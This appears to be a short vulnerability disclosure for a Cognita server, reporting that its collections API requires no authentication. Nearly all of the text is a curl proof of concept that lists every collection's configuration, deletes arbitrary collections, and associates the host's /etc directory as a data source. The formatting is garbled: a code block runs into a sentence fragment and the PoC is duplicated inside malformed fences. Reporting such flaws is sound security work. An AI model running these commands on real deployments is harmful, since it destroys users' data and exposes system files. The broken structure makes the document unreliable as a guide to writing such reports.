# Collections lifecycle without auth

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
```bash
# List all collections with full configs (no auth):
curl http://<cognita>:8000/v1/collections

# Delete any collection:
curl -X DELETE http://<cognita>:8000/v1/collections/<collection_name>

# Associate data sources:
curl -X POST http://<cognita>:8000/v1/collections/associate \
  -H "Content-Type: application/json" \
  -d '{"collection_name": "any", "data_source_fqn": "localdir:///etc"}'
``` returns full configs; POST/DELETE/associate/ingest have no authentication.

## Impact
Unauthenticated data destruction + full config disclosure.

## PoC
```
```bash
# List all collections with full configs (no auth):
curl http://<cognita>:8000/v1/collections

# Delete any collection:
curl -X DELETE http://<cognita>:8000/v1/collections/<collection_name>

# Associate data sources:
curl -X POST http://<cognita>:8000/v1/collections/associate \
  -H "Content-Type: application/json" \
  -d '{"collection_name": "any", "data_source_fqn": "localdir:///etc"}'
```
```

## Execution result
```
REPRODUCED: 200
```
